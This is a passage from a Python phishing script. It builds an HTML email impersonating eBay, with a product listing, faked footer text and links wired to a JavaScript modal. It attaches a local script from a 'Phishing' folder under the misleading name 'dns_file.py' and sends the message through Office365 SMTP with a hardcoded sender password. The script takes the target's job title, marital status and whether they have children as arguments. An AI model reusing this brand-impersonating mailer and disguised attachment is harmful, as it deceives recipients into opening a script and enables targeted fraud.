                      <table cellpadding="0" cellspacing="0" style="border-collapse: collapse !important; border-spacing: 0 !important; width: 115px; padding: 0; border: none;"> 
                       <tbody> 
                        <tr> 
                         <td align="center" height="115" style="border: 1px solid #dddddd;" valign="center" width="115"><a href="javascript:;window.parent.$('#webModal').modal('show');"><span style="border-radius: 3px; display: block; outline: none; text-decoration: none; margin: 0;"><img alt="" border="”0&quot;" class="CToWUd" src="https://caniphish.s3.ap-southeast-2.amazonaws.com/EmailTemplates/Common/images/ebay-small-4.png"></span></a></td> 
                        </tr> 
                       </tbody> 
                      </table> </td> 
                    </tr> 
                    <tr> 
                     <td style="border-collapse: collapse !important; border-spacing: 0 !important; padding: 10px 0 0; border: none;" valign="top"> <h3 style="color: #333333; font-family: Helvetica,Arial,sans-serif; font-size: 13px; font-weight: normal; line-height: normal; word-break: break-all; margin: 0 0 10px;" align="left"><a href="javascript:;window.parent.$('#webModal').modal('show');" style="text-decoration: none; color: #0654ba;">Vizio M Series M322I-B1 32" Full Array ...</a></h3> </td> 
                    </tr> 
                    <tr> 
                     <td align="left" style="border-collapse: collapse !important; border-spacing: 0 !important; font-family: Helvetica,Arial,sans-serif; font-size: 16px; line-height: 16px; font-weight: bold; padding-bottom: 10px; border: none;">$229.99</td> 
                    </tr> 
                    <tr> 
                     <td align="left" style="border-collapse: collapse !important; border-spacing: 0 !important; font-family: Helvetica,Arial,sans-serif; font-size: 11px; color: #666666; border: none;">Buy it now</td> 
                    </tr> 
                   </tbody> 
                  </table> </td> 
                </tr> 
               </tbody> 
              </table> </td> 
            </tr> 
           </tbody> 
          </table> </td> 
        </tr> 
       </tbody> 
      </table> 
      <table align="center" border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse !important; border-spacing: 0 !important; width: 100%; border: none;" bgcolor="#ffffff"> 
       <tbody> 
        <tr> 
         <td style="border-collapse: collapse !important; border-spacing: 0 !important; border: none;" valign="top" width="100%"> 
          <table align="center" border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse !important; border-spacing: 0 !important; width: 600px; border: none;"> 
           <tbody> 
            <tr> 
             <td height="5">&nbsp;</td> 
            </tr> 
            <tr> 
             <td>&nbsp;</td> 
            </tr> 
           </tbody> 
          </table> </td> 
        </tr> 
       </tbody> 
      </table> 
      <table align="center" border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse !important; border-spacing: 0 !important; width: 100%; border: none;" bgcolor="#ffffff"> 
       <tbody> 
        <tr> 
         <td style="border-collapse: collapse !important; border-spacing: 0 !important; border: none;" valign="top" width="100%"> 
          <table align="center" border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse !important; border-spacing: 0 !important; width: 600px; border: none;"> 
           <tbody> 
            <tr> 
             <td style="border-collapse: collapse !important; border-spacing: 0 !important; padding: 40px 0 60px; border: none;" valign="top"> 
              <div> 
               <p style="color: #888888; font-family: Helvetica,Arial,sans-serif; font-size: 11px; font-weight: normal; line-height: normal; margin: 0 0 10px;" align="left"><strong>Email reference id: [#<wbr>fdc85ece522644a9879c90867d6<wbr>3b#]</strong></p> 
              </div> <p style="color: #888888; font-family: Helvetica,Arial,sans-serif; font-size: 11px; font-weight: normal; line-height: normal; margin: 0 0 10px;" align="left">We don't check this mailbox, so please don't reply to this message. If you have a question, go to <a href="javascript:;window.parent.$('#webModal').modal('show');" style="text-decoration: none; color: #555555;">Help &amp; Contact</a>.</p> <p style="color: #888888; font-family: Helvetica,Arial,sans-serif; font-size: 11px; font-weight: normal; line-height: normal; margin: 0 0 10px;" align="left"><span class="il">eBay</span> sent this message to <?php include 'username.txt'; ?> . Learn more about <a href="javascript:;window.parent.$('#webModal').modal('show');" style="text-decoration: none; color: #555555;">account protection</a>. <span class="il">eBay</span> is committed to your privacy. Learn more about our <a href="javascript:;window.parent.$('#webModal').modal('show');" style="text-decoration: none; color: #555555;">privacy policy</a> and <a href="javascript:;window.parent.$('#webModal').modal('show');" style="text-decoration: none; color: #555555;">user agreement</a>.</p> <p style="color: #888888; font-family: Helvetica,Arial,sans-serif; font-size: 11px; font-weight: normal; line-height: normal; margin: 0 0 10px;" align="left">© <span class="il">eBay</span> Inc., San Jose, CA 95125</p> </td> 
            </tr> 
           </tbody> 
          </table> </td> 
        </tr> 
       </tbody> 
      </table> 
      <div class="yj6qo">
        &nbsp; 
      </div> 
      <div class="adL">
        &nbsp; 
      </div> 
      <div class="adL">
        &nbsp; 
      </div> </td> 
    </tr> 
   </tbody> 
  </table> 
  <br> 
  <br>  
 
<style>a { cursor: pointer; }</style></body></html>
"""

    # Turn these into plain/html MIMEText objects
    part1 = MIMEText(html, "html")

    # Add HTML/plain-text parts to MIMEMultipart message
    message.attach(part1)

    with open("/home/tamar/B/Phishing/create.py", "rb") as attachment_file:
        attachment = MIMEApplication(attachment_file.read())
        attachment.add_header(
            "Content-Disposition",
            "attachment",
            filename="dns_file.py"
        )
        message.attach(attachment)

    # Create secure connection with server and send email
    context = ssl.create_default_context()
    with smtplib.SMTP("smtp.office365.com", 587) as server:
        server.starttls(context=context)
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message.as_string())


if __name__ == "__main__":
    username = sys.argv[1]
    mail_Service_Name = sys.argv[2]
    title = sys.argv[3]
    job_title = sys.argv[4]
    personal_status = sys.argv[5]
    have_kids = sys.argv[6]
    receiver_email = f"{username}@{mail_Service_Name}"
    send_email("tam1362001@outlook.com", 'tam123456', receiver_email,
               title, job_title, personal_status, have_kids)
